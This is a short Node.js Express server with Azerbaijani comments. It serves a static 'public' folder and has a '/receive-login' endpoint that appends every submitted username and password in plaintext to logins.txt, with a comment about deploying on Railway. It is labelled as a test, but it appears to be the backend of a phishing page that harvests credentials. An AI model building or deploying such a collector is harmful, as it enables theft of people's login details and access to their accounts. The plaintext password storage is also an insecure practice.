const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();

// Body parser
app.use(bodyParser.urlencoded({ extended: true }));

// Public qovluğundakı faylları göstər (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, "public")));

// Login sorğusunu tutmaq (əgər istifadə edəcəksənsə)
app.post("/receive-login", (req, res) => {
  const { username, password } = req.body;

  // Fayla yazmaq (test məqsədilə)
  fs.appendFileSync("logins.txt", `User: ${username}, Pass: ${password}\n`);

  res.send("Login məlumatı qəbul olundu ✅ (test)");
});

// Server işə düşür (Railway üçün PORT)
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`Server ${PORT} portunda işləyir`);
});

